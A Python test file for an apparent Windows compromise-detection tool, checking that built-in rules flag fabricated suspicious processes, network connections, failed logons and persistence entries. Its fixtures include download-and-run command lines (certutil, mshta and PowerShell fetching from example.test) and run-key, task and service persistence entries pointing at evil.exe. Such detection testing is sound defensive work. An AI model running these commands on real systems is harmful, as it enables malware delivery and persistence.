from pathlib import Path

from amihacked.detection.engine import DetectionEngine
from amihacked.detection.rule_loader import RuleLoader


def test_builtin_rules_match_representative_suspicious_evidence():
    rules, _results = RuleLoader([Path("rules/builtin")]).load_rules()
    matches, _findings = DetectionEngine(rules).run(
        {
            "process": [
                {
                    "artifact_id": "process:100",
                    "type": "process",
                    "pid": 100,
                    "name": "powershell.exe",
                    "command_line": "powershell.exe -NoP -EncodedCommand AAAA",
                    "exe_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parent_name": "winword.exe",
                },
                {
                    "artifact_id": "process:101",
                    "type": "process",
                    "pid": 101,
                    "name": "certutil.exe",
                    "command_line": "certutil.exe -urlcache -split -f https://example.test/a.exe a.exe",
                    "exe_path": "C:\\Windows\\System32\\certutil.exe",
                    "parent_name": "cmd.exe",
                },
                {
                    "artifact_id": "process:102",
                    "type": "process",
                    "pid": 102,
                    "name": "mshta.exe",
                    "command_line": "mshta.exe https://example.test/payload.hta",
                    "exe_path": "C:\\Windows\\System32\\mshta.exe",
                    "parent_name": "explorer.exe",
                },
                {
                    "artifact_id": "process:103",
                    "type": "process",
                    "pid": 103,
                    "name": "evil.exe",
                    "command_line": "evil.exe",
                    "exe_path": "C:\\Users\\alice\\AppData\\Roaming\\evil.exe",
                    "parent_name": "explorer.exe",
                },
            ],
            "network": [
                {
                    "artifact_id": "network:unknown:1.2.3.4:443",
                    "type": "network",
                    "pid": None,
                    "process_name": None,
                    "remote_address": "1.2.3.4",
                    "remote_port": 443,
                    "status": "ESTABLISHED",
                    "is_public_remote": True,
                }
            ],
            "log": [
                {
                    "artifact_id": "log:failed-auth",
                    "type": "log",
                    "source": "windows_event_log",
                    "channel": "Security",
                    "event_id": 4625,
                    "message": "An account failed to log on.",
                }
            ],
            "persistence": [
                {
                    "artifact_id": "persistence:run:test",
                    "type": "persistence",
                    "source": "registry_run_key",
                    "name": "BadRun",
                    "command": "C:\\Users\\alice\\AppData\\Roaming\\evil.exe",
                    "path": "C:\\Users\\alice\\AppData\\Roaming\\evil.exe",
                },
                {
                    "artifact_id": "persistence:task:test",
                    "type": "persistence",
                    "source": "scheduled_task",
                    "name": "BadTask",
                    "command": "C:\\Users\\alice\\AppData\\Roaming\\evil.exe",
                    "path": "C:\\Users\\alice\\AppData\\Roaming\\evil.exe",
                },
                {
                    "artifact_id": "persistence:service:test",
                    "type": "persistence",
                    "source": "service",
                    "name": "BadService",
                    "command": "C:\\Users\\Public\\evil.exe",
                    "path": "C:\\Users\\Public\\evil.exe",
                },
                {
                    "artifact_id": "persistence:remote:test",
                    "type": "persistence",
                    "source": "scheduled_task",
                    "name": "RemoteTask",
                    "command": "powershell.exe -c iwr https://example.test/a.ps1",
                },
            ],
        }
    )

    matched_rule_ids = {match.rule_id for match in matches}

    assert "AH-WIN-PROC-0001" in matched_rule_ids
    assert "AH-WIN-PROC-0002" in matched_rule_ids
    assert "AH-WIN-PROC-0003" in matched_rule_ids
    assert "AH-WIN-LOLBIN-0001" in matched_rule_ids
    assert "AH-WIN-LOLBIN-0002" in matched_rule_ids
    assert "AH-WIN-NET-0002" in matched_rule_ids
    assert "AH-WIN-PERSIST-0001" in matched_rule_ids
    assert "AH-WIN-PERSIST-0002" in matched_rule_ids
    assert "AH-WIN-PERSIST-0003" in matched_rule_ids
    assert "AH-WIN-PERSIST-0004" in matched_rule_ids
    assert "AH-LOG-AUTH-0001" in matched_rule_ids
